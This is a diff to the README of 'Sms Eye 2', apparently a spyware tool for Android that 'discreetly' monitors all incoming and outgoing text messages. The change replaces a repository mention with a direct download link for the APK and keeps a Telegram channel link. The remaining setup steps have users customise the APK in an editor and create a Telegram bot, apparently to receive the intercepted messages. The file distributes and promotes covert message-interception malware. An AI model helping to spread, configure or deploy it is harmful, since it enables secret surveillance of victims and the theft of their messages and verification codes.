@@ -17,7 +17,7 @@ This tool allows you to discreetly monitor all incoming and outgoing text messag
 ## Setup
 To set up Sms Eye, follow these steps
 ### Download Sms Eye 2 APK
-download the Sms Eye 2 APK file from our repository or [Telegram channel](https://t.me/AbyssalArmy).
+download the Sms Eye 2 APK file from this [Download link](https://github.com/AbyssalArmy/SmsEye2/releases/download/v1.0.0/SmsEye2.apk) or our [Telegram channel](https://t.me/AbyssalArmy).
 ### Downlaod Apk Editor
 Download the APK Editor to customize the Sms Eye 2 application, you can download Apk Editor from our [Telegram channel](https://t.me/AbyssalArmy).
 ### Create Telegram bot
